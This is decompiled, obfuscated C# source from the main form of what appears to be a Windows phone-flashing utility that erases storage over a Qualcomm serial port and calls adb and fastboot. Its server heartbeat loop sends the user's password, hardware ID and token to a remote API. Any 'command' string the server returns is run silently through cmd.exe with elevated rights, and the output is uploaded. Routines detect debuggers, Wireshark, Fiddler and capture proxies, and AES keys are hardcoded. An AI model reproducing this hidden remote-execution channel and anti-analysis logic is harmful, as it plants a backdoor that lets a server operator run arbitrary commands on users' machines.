						num = num3 + 1;
						continue;
					}
					CS_0024_003C_003E8__locals1._003C_003E4__this.Msg($"擦除LUN{(int)num}... ");
					CS_0024_003C_003E8__locals1._003C_003E4__this.msgred();
					CS_0024_003C_003E8__locals1._003C_003E4__this.fe("Error\n");
					break;
				}
			}
			else if (CS_0024_003C_003E8__locals1.UFS == "512")
			{
				nint num4 = await LinQcPortClass.ERasexml(xml: string.Format(Firehose.ERASE, CS_0024_003C_003E8__locals1.UFS, 0), SePort: SepSl);
				CS_0024_003C_003E8__locals1.ConRes = (int)num4;
				if (CS_0024_003C_003E8__locals1.ConRes == 1)
				{
					CS_0024_003C_003E8__locals1._003C_003E4__this.Msg("擦除LUN0...");
					CS_0024_003C_003E8__locals1._003C_003E4__this.fa();
					CS_0024_003C_003E8__locals1._003C_003E4__this.Msg("OK\n");
				}
				else
				{
					CS_0024_003C_003E8__locals1._003C_003E4__this.Msg("擦除LUN0...");
					CS_0024_003C_003E8__locals1._003C_003E4__this.msgred();
					CS_0024_003C_003E8__locals1._003C_003E4__this.fe("Error\n");
				}
			}
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass539_0
	{
		public string fileName;

		public string filePath;

		public Progress<(double percent, double speedMBps)> progress;

		public Form1 _003C_003E4__this;

		internal void _1((double percent, double speedMBps) value)
		{
			((UIProcessBar)_003C_003E4__this.m_c1).Value = Math.Min(10000, (int)(value.percent * 10000.0));
			((Control)_003C_003E4__this.m_cd).Text = $"{value.speedMBps:F2} MB/s ";
			((Control)_003C_003E4__this.m_cf).Text = fileName;
		}

		internal string _2()
		{
			return (string)_003C_003E4__this._18b(filePath, progress);
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass540_0
	{
		public string file;

		public Form1 _003C_003E4__this;
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass540_1
	{
		public Progress<(double percent, double speedMBps)> progress;

		public _003C_003Ec__DisplayClass540_0 CS_0024_003C_003E8__locals1;

		internal string _1()
		{
			return (string)CS_0024_003C_003E8__locals1._003C_003E4__this._18b(CS_0024_003C_003E8__locals1.file, progress);
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass551_0
	{
		public string originalFilePath;

		public string newFilePath;

		public string listfilepath;

		internal void _1()
		{
			File.Move(originalFilePath, newFilePath);
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass551_1
	{
		public List<string> keysToAppend;

		public List<string> propsToAppend;

		public _003C_003Ec__DisplayClass551_0 CS_0024_003C_003E8__locals1;

		internal void _1()
		{
			File.AppendAllLines(CS_0024_003C_003E8__locals1.listfilepath, keysToAppend);
		}

		internal void _2()
		{
			File.AppendAllLines(CS_0024_003C_003E8__locals1.newFilePath, propsToAppend);
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass552_0
	{
		public string command;

		public Form1 _003C_003E4__this;

		internal async Task _1()
		{
			object startInfo = new ProcessStartInfo
			{
				FileName = "cmd.exe",
				Arguments = "/c " + command,
				CreateNoWindow = true,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				RedirectStandardError = true,
				WorkingDirectory = "C:\\TMFTool\\Cust\\"
			};
			object obj = Process.Start((ProcessStartInfo)startInfo);
			try
			{
				((Process)obj).StandardOutput.ReadToEnd();
				object value = ((Process)obj).StandardError.ReadToEnd();
				((Process)obj).WaitForExit();
				if (!string.IsNullOrEmpty((string)value))
				{
					_003C_003E4__this.fa();
					_003C_003E4__this.fe("OK\n");
					await _003C_003E4__this._19a();
					_003C_003E4__this._19b();
				}
				else
				{
					_003C_003E4__this.fa();
					_003C_003E4__this.fe("OK\n");
					await _003C_003E4__this._19a();
				}
			}
			finally
			{
				((IDisposable)obj)?.Dispose();
			}
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass555_0
	{
		public string filePath1;

		public string textToAppend1;

		public string filePath2;

		public string textToAppend2;

		internal void _1()
		{
			using StreamWriter streamWriter = new StreamWriter(filePath1, append: true);
			streamWriter.WriteLine(textToAppend1);
		}

		internal void _2()
		{
			using StreamWriter streamWriter = new StreamWriter(filePath2, append: true);
			streamWriter.WriteLine(textToAppend2);
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass559_0
	{
		public Process proc;

		internal void _1()
		{
			proc.WaitForExit();
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass567_0
	{
		public string command;

		public Form1 _003C_003E4__this;
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass567_1
	{
		public SerialPort SepSl;

		public _003C_003Ec__DisplayClass567_0 CS_0024_003C_003E8__locals1;

		internal async Task _1()
		{
			object obj = await LinQcPortClass.xmlinfo(SepSl, CS_0024_003C_003E8__locals1.command);
			CS_0024_003C_003E8__locals1._003C_003E4__this.Msg("发送命令: " + CS_0024_003C_003E8__locals1.command + "\n");
			CS_0024_003C_003E8__locals1._003C_003E4__this.Msg("设备返回" + (string)obj + "\n");
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass83_0
	{
		public Form1 _003C_003E4__this;

		public DateTime lastTime;

		public long lastBytes;

		internal void _1(object s, DownloadProgressChangedEventArgs e)
		{
			((Control)_003C_003E4__this.m_c1).Invoke((Delegate)(System.Windows.Forms.MethodInvoker)(() =>
			{
				((UIProcessBar)_003C_003E4__this.m_c1).Value = e.ProgressPercentage;
				DateTime now = DateTime.Now;
				TimeSpan timeSpan = now - lastTime;
				long num = e.BytesReceived - lastBytes;
				if (timeSpan.TotalSeconds > 0.5)
				{
					double num2 = (double)num / timeSpan.TotalSeconds / 1024.0;
					((Control)_003C_003E4__this.m_cd).Text = $"Spd: {num2:F2} KB/s";
					lastTime = now;
					lastBytes = e.BytesReceived;
				}
				double num3 = (double)e.BytesReceived / 1024.0 / 1024.0;
				double num4 = (double)e.TotalBytesToReceive / 1024.0 / 1024.0;
				((Control)_003C_003E4__this.m_cf).Text = $"Download {num3:F2} MB / {num4:F2} MB";
			}));
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass83_1
	{
		public TaskCompletionSource<byte[]> tcs;

		public _003C_003Ec__DisplayClass83_0 CS_0024_003C_003E8__locals1;

		internal void _1(object s, DownloadDataCompletedEventArgs e)
		{
			((Control)CS_0024_003C_003E8__locals1._003C_003E4__this.m_c1).Invoke((Delegate)(System.Windows.Forms.MethodInvoker)(() =>
			{
				if (e.Error != null)
				{
					CS_0024_003C_003E8__locals1._003C_003E4__this.msgred();
					CS_0024_003C_003E8__locals1._003C_003E4__this.Msg("ERROR\n");
					tcs.SetException(e.Error);
				}
				else
				{
					CS_0024_003C_003E8__locals1._003C_003E4__this.fa();
					CS_0024_003C_003E8__locals1._003C_003E4__this.Msg("OK\n");
					tcs.SetResult(e.Result);
				}
			}));
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass90_0
	{
		public int ConRes;

		public Form1 _003C_003E4__this;

		internal void _1()
		{
			((Button)_003C_003E4__this.m_11).PerformClick();
		}

		internal void _2()
		{
			((ToolStripItem)_003C_003E4__this.m_12)?.PerformClick();
		}

		internal void _3()
		{
			((Button)_003C_003E4__this.m_11).PerformClick();
		}

		internal void _4()
		{
			((ToolStripItem)_003C_003E4__this.m_12)?.PerformClick();
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass90_1
	{
		public SerialPort SepSl;

		public _003C_003Ec__DisplayClass90_0 CS_0024_003C_003E8__locals1;
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass90_2
	{
		public string xml;

		public _003C_003Ec__DisplayClass90_1 CS_0024_003C_003E8__locals2;

		internal async Task _1()
		{
			nint num = await LinQcPortClass.SendCon(CS_0024_003C_003E8__locals2.SepSl, xml);
			CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1.ConRes = (int)num;
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass91_0
	{
		public int ConRes;
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass91_1
	{
		public SerialPort SepSl;

		public _003C_003Ec__DisplayClass91_0 CS_0024_003C_003E8__locals1;
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass91_2
	{
		public string xml;

		public _003C_003Ec__DisplayClass91_1 CS_0024_003C_003E8__locals2;

		internal async Task _1()
		{
			nint num = await LinQcPortClass.SendCon(CS_0024_003C_003E8__locals2.SepSl, xml);
			CS_0024_003C_003E8__locals2.CS_0024_003C_003E8__locals1.ConRes = (int)num;
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass98_0
	{
		public SerialPort SepSl;
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass98_1
	{
		public string xml;

		public _003C_003Ec__DisplayClass98_0 CS_0024_003C_003E8__locals1;

		internal Task<int> _1()
		{
			return LinQcPortClass.SendCon(CS_0024_003C_003E8__locals1.SepSl, xml);
		}
	}

	private object _0;

	private object m_1;

	private object m_2;

	private object m_3;

	private object m_4;

	private object m_5;

	private IntPtr m_6 = (IntPtr)0;

	private const int m_7 = 3;



	private object m_9;

	private object m_a = default;

	public Comm comm = new Comm();

	private object m_c;

	private object m_d = string.Empty;

	private object m_e = new StringBuilder();

	private object m_f = new StringBuilder();

	private object m_10 = "";

	private object m_11;

	private object m_12;

	private object m_13;

	private IntPtr m_14 = (IntPtr)0;

	private IntPtr _15 = (IntPtr)0;

	private object _16 = "";

	private object _17;

	private object _18;

	private object _19 = new List<FileItem>();



	private object _1b = default;

	private object m_1c = "C:\\TMFTool\\recovery.exe";

	private object m_1d = "C:\\TMFTool\\adb.exe";

	private object _1e = "C:\\TMFTool\\fastboot.exe";

	private object m_1f;

	private object _20;

	private IntPtr m_21;



	private object m_23;

	private object _24;

	private object m_25;

	private object m_26;

	private object m_27;

	private object m_28;

	private object m_29;

	private object _2a;

	private object m_2b;

	private IntPtr _2c;

	public string lang;

	public string modules;

	private IntPtr m_2f;

	private Color _30 = Color.Red;

	private Color m_31 = Color.Blue;

	private object m_32;

	private object m_33;

	private object m_34;

	private static object m_35;

	private static object _36;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private object m_37;

	private object m_38 = "";

	private object m_39;

	private IntPtr m_3a;



	public string PortQcom;



	private object m_3e = new List<RawPartition>();

	private object _3f = new List<RawPartition>();

	public static SafeFileHandle OpenWritePort = new SafeFileHandle(IntPtr.Zero, ownsHandle: false);

	private object _41 = new BindingList<RawPartition>();

	private const uint m_42 = 2u;

	private const uint m_43 = 8u;

	private const uint m_44 = 1u;

	private const uint _45 = 4u;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private object m_46;

	private OpreationMain m_47;

	private READPartition _48;

	private IntPtr _49 = (IntPtr)0;



	private object m_4b = new Stopwatch();

	private volatile bool m_4c = false;

	private CHUNK_HEADER m_4d;

	private IntPtr m_4e = (IntPtr)0;

	private SPARSE_HEADER m_4f;

	private object m_50;

	private object m_51;

	private static readonly object _52 = new HttpClient();

	public string SigKey = "LKHIKNIBUNUMI892";

	private object m_54;

	private IntPtr _55 = (IntPtr)0;

	private object m_56 = new Stopwatch();

	private object m_57 = "";

	private ulong m_58 = 0uL;

	private IntPtr m_59;

	private IntPtr m_5a;

	private IntPtr _5b = (IntPtr)0;

	private object _5c = new string[128];

	private object _5d = new string[128];

	private object _5e = new string[128];

	private object m_5f = new ulong[128];

	private object m_60 = new ulong[128];

	private object _61 = new string[128];

	private object _62 = new string[128];

	private object _63 = new ulong[128];

	private object _64 = new ulong[128];

	private object _65 = new string[128];

	private object m_66 = new ulong[128];

	private object _67 = new ulong[128];

	private object _68 = new string[128];

	private object m_69 = new ulong[128];

	private object m_6a = new string[128];

	private object m_6b = new string[128];

	private object m_6c;

	private object m_6d = default;

	private object m_6e;

	private object m_6f;

	private IntPtr m_70 = (IntPtr)0;

	private object m_71;

	private object m_72;

	private object m_73 = new List<string>();

	private static IntPtr m_74;

	private object m_75 = new List<string>();

	private object m_76;

	private object m_77 = "C:\\TMFTool\\payload_dumper.exe";

	private object m_78 = "http://pan.tmtft.cn:5020";



	private static object m_7a;

	private static object m_7b;

	public static string BaseUrl;

	private IntPtr _7d = (IntPtr)1;

	private IntPtr _7e = (IntPtr)0;

	private object m_7f;

	private object m_80 = new List<string>();

	public string path;

	private object m_82 = "C:\\TMFTool\\lpmake.exe";

	private object m_83 = "C:\\TMFTool\\simg2img.exe";

	private IntPtr m_84 = (IntPtr)0;

	private object m_85 = "C:\\TMFTool\\GKI";

	private object m_86 = null;

	private object m_87;

	private object _88;

	private object m_89;

	private object m_8a;

	private object m_8b;

	private object m_8c;

	private object m_8d;

	private object m_8e;

	private object m_8f;

	private object m_90;

	private object m_91;

	private object m_92;

	private object m_93;

	private object m_94;

	private object m_95;

	private object _96;

	private object m_97;

	private object m_98;

	private object m_99;

	private object m_9a;

	private object m_9b;

	private object m_9c;

	private object m_9d;

	private object m_9e;

	private object m_9f;

	private object m_a0;

	private object m_a1;

	private object m_a2;

	private object m_a3;

	private object m_a4;

	private object m_a5;

	private object m_a6;

	private object m_a7;

	private object m_a8;

	private object m_a9;

	private object aa;

	private object m_ab;

	private object m_ac;

	private object m_ad;

	private object m_ae;

	private object m_af;

	private object m_b0;

	private object m_b1;

	private object m_b2;

	private object m_b3;

	private object m_b4;

	private object m_b5;

	private object m_b6;

	private object m_b7;

	private object m_b8;

	private object m_b9;

	private object m_ba;

	private object m_bb;

	private object m_bc;

	private object m_bd;

	private object m_be;

	private object m_bf;

	private object m_c0;

	private object m_c1;

	private object m_c2;

	private object m_c3;

	private object m_c4;

	private object m_c5;

	private object m_c6;

	private object m_c7;

	private object m_c8;

	private object m_c9;

	private object m_ca;

	private object m_cb;

	private object m_cc;

	private object m_cd;

	private object m_ce;

	private object m_cf;

	private object m_d0;

	private object m_d1;

	private object m_d2;

	private object m_d3;

	private object m_d4;

	private object m_d5;

	private object m_d6;

	private object m_d7;

	private object m_d8;

	private object m_d9;

	private object m_da;

	private object m_db;

	private object m_dc;

	private object m_dd;

	private object m_de;

	private object m_df;

	private object m_e0;

	private object m_e1;

	private object m_e2;

	private object m_e3;

	private object m_e4;

	private object m_e5;

	private object m_e6;

	private object m_e7;

	private object m_e8;

	private object m_e9;

	private object m_ea;

	private object m_eb;

	private object m_ec;

	private object m_ed;

	private object m_ee;

	private object m_ef;

	private object m_f0;

	private object f1;

	private object m_f2;

	private object m_f3;

	private object m_f4;

	private object m_f5;

	private object m_f6;

	private object m_f7;

	private object m_f8;

	private object m_f9;

	private object m_fa;

	private object m_fb;

	private object fc;

	private object fd;

	private object m_fe;

	private object ff;

	private object m_100;

	private object m_101;

	private object m_102;

	private object m_103;

	private object m_104;

	private object m_105;

	private object m_106;

	private object m_107;

	private object m_108;

	private object m_109;

	private object m_10a;

	private object m_10b;

	private object m_10c;

	private object m_10d;

	private object m_10e;

	private object m_10f;

	private object m_110;

	private object m_111;

	private object m_112;

	private object m_113;

	private object m_114;

	private object m_115;

	private object m_116;

	private object m_117;

	private object m_118;

	private object m_119;

	private object m_11a;

	private object m_11b;

	private object m_11c;

	private object m_11d;

	private object _11e;

	private object m_11f;

	private object m_120;

	private object m_121;

	private object m_122;

	private object m_123;

	private object m_124;

	private object m_125;

	private object m_126;

	private object m_127;

	private object m_128;

	private object m_129;

	private object m_12a;

	private object m_12b;

	private object m_12c;

	private object m_12d;

	private object m_12e;

	private object m_12f;

	private object m_130;

	private object m_131;

	private object m_132;

	private object m_133;

	private object m_134;

	private object m_135;

	private object m_136;

	private object m_137;

	private object m_138;

	private object m_139;

	private object m_13a;

	private object m_13b;

	private object m_13c;

	private object m_13d;

	private object _13e;

	private object _13f;

	private object m_140;

	private object m_141;

	private object m_142;

	private object m_143;

	private object m_144;

	private object m_145;

	private object m_146;

	private object m_147;

	private object m_148;

	private object m_149;

	private object m_14a;

	private object m_14b;

	private object m_14c;

	private object m_14d;

	private object m_14e;

	private object m_14f;

	private object m_150;

	private object m_151;

	private object m_152;

	private object m_153;

	private object m_154;

	private object m_155;

	private object m_156;

	private object m_157;

	private object m_158;

	private object m_159;

	private object m_15a;

	private object m_15b;

	private object m_15c;

	private object m_15d;

	private object m_15e;

	private object m_15f;

	private object _160;

	private object m_161;

	private object m_162;

	private object m_163;

	private object m_164;

	private object m_165;

	private object m_166;

	private object m_167;

	private object m_168;

	private object m_169;

	private object m_16a;

	private object m_16b;

	private object m_16c;

	private object m_16d;

	private object m_16e;

	private object m_16f;

	private object m_170;

	private object m_171;

	private object m_172;

	private object m_173;

	private object m_174;

	private object m_175;

	private object m_176;

	private object m_177;

	private string vid
	{
		[CompilerGenerated]
		get
		{
			return (string)this.m_37;
		}
		[CompilerGenerated]
		set
		{
			this.m_37 = value;
		}
	}

	private string BACKUPFOLDER_Path
	{
		[CompilerGenerated]
		get
		{
			return (string)this.m_46;
		}
		[CompilerGenerated]
		set
		{
			this.m_46 = value;
		}
	}

	public Form1(string sessionToken, string username, string api, string logintimer, string password, string tile, string token, string hwid, string role, int sterr, string lang, string modules)
	{
		_1b7();
		_79();
		_7a();
		e();
		this.m_71 = sessionToken;
		_24 = username;
		this.m_25 = api;
		this.m_26 = logintimer;
		this.m_27 = password;
		this.m_28 = tile;
		this.m_29 = token;
		_2a = hwid;
		this.m_2b = role;
		_2c = (IntPtr)sterr;
		this.lang = lang;
		this.modules = modules;
		this.m_13 = new HashSet<string>();
		((UIComboBox)this.m_10a).SelectedIndex = 0;
		((Control)this.m_136).Enabled = false;
		((Control)this.m_137).Enabled = false;
		_42();
	}

	private async Task _1(object cmd)
	{
		try
		{
			object CS_0024_003C_003E8__locals4 = new _003C_003Ec__DisplayClass48_0();
			((_003C_003Ec__DisplayClass48_0)CS_0024_003C_003E8__locals4)._003C_003E4__this = this;
			object output = await _2(cmd);
			HWIDGenerator.GetHWID();
			object value = _24;
			object value2 = this.m_27;
			if (string.IsNullOrEmpty((string)value) || string.IsNullOrEmpty((string)value2))
			{
				AntdUI.Modal.open((Form)(object)this, "用户名或密码不能为空", "错误", (TType)4);
				return;
			}
			object api = (string)this.m_25 + "/api/V1/UPdata";
			long num = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
			object obj = $"username={_24}&password={this.m_27}&timestamp={num}";
			object mD5Hash = AesHelper.GetMD5Hash((string)obj + SigKey);
			object obj2 = new
			{
				username = (string)_24,
				password = (string)this.m_27,
				hwid = (string)_2a,
				Token = (string)this.m_29,
				timestamp = num,
				output = (string)output,
				sign = (string)mD5Hash
			};
			object plainText = JsonConvert.SerializeObject(obj2);
			object raw = "\"" + AesHelper.Encrypt((string)plainText) + "\"";
			object obj3 = await HttpHelper.Post((string)api, (string)raw);
			nint num2 = ((JToken)obj3).Value<int>((object)"code");
			((_003C_003Ec__DisplayClass48_0)CS_0024_003C_003E8__locals4).msg = ((JToken)obj3).Value<string>((object)"message");
			if (num2 != 200)
			{
				((Control)this).Invoke((Delegate)(Action)(() =>
				{
					AntdUI.Modal.open((Form)(object)((_003C_003Ec__DisplayClass48_0)CS_0024_003C_003E8__locals4)._003C_003E4__this, ((_003C_003Ec__DisplayClass48_0)CS_0024_003C_003E8__locals4).msg, "错误", (TType)4);
				}));
				await Task.Delay(new Random().Next(1000, 8000));
				((Control)this).Hide();
				Environment.Exit(0);
			}
		}
		catch (Exception ex)
		{
			object obj4 = ex;
			fe("执行命令失败: " + ((Exception)obj4).Message);
		}
	}

	private async Task<string> _2(object command)
	{
		object startInfo = new ProcessStartInfo
		{
			FileName = "cmd.exe",
			Arguments = "/c " + (string)command,
			RedirectStandardOutput = true,
			RedirectStandardError = true,
			UseShellExecute = false,
			CreateNoWindow = true,
			Verb = "runas"
		};
		object obj = new Process();
		try
		{
			((Process)obj).StartInfo = (ProcessStartInfo)startInfo;
			((Process)obj).Start();
			object obj2 = ((Process)obj).StandardOutput.ReadToEndAsync();
			object obj3 = ((Process)obj).StandardError.ReadToEndAsync();
			((Process)obj).WaitForExit();
			object obj4 = await (Task<string>)obj2;
			object obj5 = await (Task<string>)obj3;
			return (string)(string.IsNullOrWhiteSpace((string)obj5) ? obj4 : obj5);
		}
		finally
		{
			((IDisposable)obj)?.Dispose();
		}
	}

	private async Task _3(CancellationToken token)
	{
		while (!token.IsCancellationRequested)
		{
			object CS_0024_003C_003E8__locals6 = new _003C_003Ec__DisplayClass51_0();
			((_003C_003Ec__DisplayClass51_0)CS_0024_003C_003E8__locals6)._003C_003E4__this = this;
			object api = (string)this.m_25 + "/api/V1/heartbeat";
			long num = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
			object obj = $"username={_24}&password={this.m_27}&timestamp={num}";
			object mD5Hash = AesHelper.GetMD5Hash((string)obj + SigKey);
			object obj2 = new
			{
				username = (string)_24,
				password = (string)this.m_27,
				hwid = (string)_2a,
				Token = (string)this.m_29,
				timestamp = num,
				sign = (string)mD5Hash
			};
			object plainText = JsonConvert.SerializeObject(obj2);
			object raw = "\"" + AesHelper.Encrypt((string)plainText) + "\"";
			object obj3 = await HttpHelper.Post((string)api, (string)raw);
			nint num2 = ((JToken)obj3).Value<int>((object)"code");
			((_003C_003Ec__DisplayClass51_0)CS_0024_003C_003E8__locals6).msg = ((JToken)obj3).Value<string>((object)"message");
			object obj4 = ((JToken)obj3).Value<string>((object)"command");
			switch ((long)num2)
			{
			case 200L:
				this.m_2f = (IntPtr)0;
				if (!string.IsNullOrWhiteSpace((string)obj4))
				{
					object cmd = obj4;
					await _1(cmd);
				}
				await Task.Delay(15000, token);
				continue;
			case 500L:
				this.m_2f += (nint)1;
				if ((nint)this.m_2f < 3)
				{
					((Control)this).Invoke((Delegate)(Action)(() =>
					{
						Message.error((Form)(object)((_003C_003Ec__DisplayClass51_0)CS_0024_003C_003E8__locals6)._003C_003E4__this, "注意:尝试重新链接服务器失败:" + ((_003C_003Ec__DisplayClass51_0)CS_0024_003C_003E8__locals6).msg, (Font)null, (int?)null);
					}));
					await Task.Delay(10000, token);
					continue;
				}
				break;
			}
			((System.Windows.Forms.Timer)this.m_e4).Stop();
			((Control)this).Invoke((Delegate)(Action)(() =>
			{
				AutoCloseMessageBox.Show("服务器链接丢失:" + ((_003C_003Ec__DisplayClass51_0)CS_0024_003C_003E8__locals6).msg, 3000);
				((Control)(object)((_003C_003Ec__DisplayClass51_0)CS_0024_003C_003E8__locals6)._003C_003E4__this).Hide();
			}));
			object obj5 = new Random();
			nint num3 = ((Random)obj5).Next(1000, 5000);
			await Task.Delay((int)num3);
			Environment.Exit(0);
		}
	}

	private async Task _4(CancellationToken token)
	{
		while (!token.IsCancellationRequested)
		{
			try
			{
				if (((Task)this.m_2).IsCompleted || ((Task)this.m_2).Exception != null)
				{
					((CancellationTokenSource)_0).Cancel();
					((CancellationTokenSource)_0).Dispose();
					_0 = new CancellationTokenSource();
					this.m_2 = Task.Run(() => _3(((CancellationTokenSource)_0).Token), ((CancellationTokenSource)_0).Token);
				}
				await Task.Delay(1000, token);
			}
			catch
			{
				((CancellationTokenSource)this.m_1).Cancel();
				Application.Exit();
			}
		}
	}

	private async Task _5(CancellationToken token)
	{
		while (!token.IsCancellationRequested)
		{
			try
			{
				if (((Task)this.m_3).IsCompleted || ((Task)this.m_3).Exception != null)
				{
					((CancellationTokenSource)this.m_1).Cancel();
					((CancellationTokenSource)this.m_1).Dispose();
					this.m_1 = new CancellationTokenSource();
					this.m_3 = Task.Run(() => _4(((CancellationTokenSource)this.m_1).Token), ((CancellationTokenSource)this.m_1).Token);
				}
				await Task.Delay(1000, token);
			}
			catch
			{
				((CancellationTokenSource)_0).Cancel();
				Application.Exit();
			}
		}
	}

	private void _6()
	{
		_0 = new CancellationTokenSource();
		this.m_1 = new CancellationTokenSource();
		this.m_2 = Task.Run(() => _3(((CancellationTokenSource)_0).Token), ((CancellationTokenSource)_0).Token);
		this.m_3 = Task.Run(() => _4(((CancellationTokenSource)this.m_1).Token), ((CancellationTokenSource)this.m_1).Token);
	}

	private void _7()
	{
		((CancellationTokenSource)_0)?.Cancel();
		((CancellationTokenSource)this.m_1)?.Cancel();
	}

	private void _8()
	{
		this.m_4 = new CancellationTokenSource();
		this.m_5 = new CancellationTokenSource();
		Task.Run(() => b(((CancellationTokenSource)this.m_4).Token), ((CancellationTokenSource)this.m_4).Token);
		Task.Run(() => d(((CancellationTokenSource)this.m_5).Token), ((CancellationTokenSource)this.m_5).Token);
	}

	private void _9()
	{
		((CancellationTokenSource)this.m_4)?.Cancel();
		((CancellationTokenSource)this.m_5)?.Cancel();
	}

	private async Task a()
	{
		long num = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
		object obj = $"username={_24}&password={this.m_27}&timestamp={num}";
		object mD5Hash = AesHelper.GetMD5Hash((string)obj + SigKey);
		object obj2 = new
		{
			username = (string)_24,
			password = (string)this.m_27,
			Timestamp = num,
			Token = (string)this.m_29,
			Sign = (string)mD5Hash
		};
		object plainText = JsonConvert.SerializeObject(obj2);
		object stringToEscape = AesHelper.Encrypt((string)plainText);
		object obj3 = Uri.EscapeDataString((string)stringToEscape);
		object obj4 = await HttpHelper.Get(Url: "/api/V1/Ban?encryptedRequest=" + (string)obj3, api: (string)this.m_25);
		nint num2 = ((JToken)obj4).Value<int>((object)"code");
		object obj5 = ((JToken)obj4).Value<string>((object)"message");
		if (num2 != 200)
		{
			msgred();
			fe((string)obj5 + "\n");
			EnableButtons();
		}
	}

	private async Task b(CancellationToken token)
	{
		object source = new int[4] { 8888, 8080, 8000, 3128 };
		while (!token.IsCancellationRequested)
		{
			try
			{
				object defaultWebProxy = WebRequest.DefaultWebProxy;
				if (defaultWebProxy != null)
				{
					object destination = new Uri("http://www.example.com");
					object proxy = ((IWebProxy)defaultWebProxy).GetProxy((Uri)destination);
					if (((Uri)proxy).Host == "127.0.0.1" && ((IEnumerable<int>)source).Contains(((Uri)proxy).Port))
					{
						object filePath = _71();
						await _74(filePath);
						await a();
						UIMessageBox.Show($"检测到抓包代理端口 {((Uri)proxy).Port}，电脑环境异常。程序将关闭。", "代理检测", (UIStyle)4, (UIMessageBoxButtons)0, false, true, 0);
						Application.Exit();
						break;
					}
				}
				if (c() != 0)
				{
					object filePath2 = _71();
					await _74(filePath2);
					await a();
					UIMessageBox.Show("检测到可疑根证书（抓包工具注入），电脑环境异常。程序将关闭。", "证书检测", (UIStyle)4, (UIMessageBoxButtons)0, false, true, 0);
					Application.Exit();
					break;
				}
			}
			catch (Exception)
			{
			}
			await Task.Delay(3000, token);
		}
	}

	private uint c()
	{
		string[] array = new string[1] { "Fiddler" };
		StoreLocation[] array2 = new StoreLocation[2]
		{
			StoreLocation.CurrentUser,
			StoreLocation.LocalMachine
		};
		try
		{
			StoreLocation[] array3 = array2;
			foreach (StoreLocation storeLocation in array3)
			{
				using X509Store x509Store = new X509Store(StoreName.Root, storeLocation);
				x509Store.Open(OpenFlags.ReadOnly);
				foreach (X509Certificate2 certificate in x509Store.Certificates)
				{
					string[] array4 = array;
					foreach (string value in array4)
					{
						if (certificate.Issuer.IndexOf(value, StringComparison.OrdinalIgnoreCase) >= 0 || certificate.Subject.IndexOf(value, StringComparison.OrdinalIgnoreCase) >= 0)
						{
							return 1u;
						}
					}
				}
			}
		}
		catch
		{
		}
		return 0u;
	}

	private async Task d(CancellationToken token)
	{
		while (!token.IsCancellationRequested)
		{
			try
			{
				if (_11() != 0 || _12() != 0 || _13() != 0)
				{
					this.m_6 += (nint)1;
					if ((nint)this.m_6 >= 3)
					{
						await a();
						_14();
					}
				}
				else
				{
					this.m_6 = (IntPtr)0;
				}
			}
			catch (Exception)
			{
			}
			await Task.Delay(3000, token);
		}
	}

	private void e()
	{
		this.m_23 = new System.Windows.Forms.Timer();
		((System.Windows.Forms.Timer)this.m_23).Interval = 1000;
		((System.Windows.Forms.Timer)this.m_23).Tick += f;
		((System.Windows.Forms.Timer)this.m_23).Start();
	}

	private async void f(object sender, object e)
	{
		if (_11() != 0 || _12() != 0 || _13() != 0)
		{
			this.m_6 += (nint)1;
			if ((nint)this.m_6 >= 3)
			{
				await a();
				_14();
			}
		}
		else
		{
			this.m_6 = (IntPtr)0;
		}
	}

	private async Task<bool> _10(object username)
	{
		if (string.IsNullOrWhiteSpace((string)username))
		{
			return false;
		}
		falseButtons();
		object key = "tamimtamimtamiatamimtamiamtiamit";
		object iv = "tamimtamimtamtat";
		object value = Encrypt((string)username, (string)key, (string)iv);
		try
		{
			object obj = new HttpClient();
			try
			{
				object nameValueCollection = new Dictionary<string, string> { 
				{
					"username",
					(string)value
				} };
				object obj2 = JsonConvert.DeserializeObject<Dictionary<string, string>>(await (await ((HttpClient)obj).PostAsync(content: (HttpContent)new FormUrlEncodedContent((IEnumerable<KeyValuePair<string, string>>)nameValueCollection), requestUri: (string)this.m_25 + "/api/V1/ban_api.php")).Content.ReadAsStringAsync());
				if (obj2 == null || ((Dictionary<string, string>)obj2)["status"] != "success")
				{
					return true;
				}
			}
			finally
			{
				((IDisposable)obj)?.Dispose();
			}
		}
		catch (Exception)
		{
		}
		return false;
	}

	private uint _11()
	{
		return Debugger.IsAttached ? 1u : 0u;
	}

	private uint _12()
	{
		string[] array = new string[4] { "Wireshark", "Fiddler", "HttpAnalyzer", "Sunny抓包工具3.0" };
		string[] array2 = array;
		foreach (string processName in array2)
		{
			Process[] processesByName = Process.GetProcessesByName(processName);
			if (processesByName.Length != 0)
			{
				return 1u;
			}
		}
		return 0u;
	}

	private uint _13()
	{
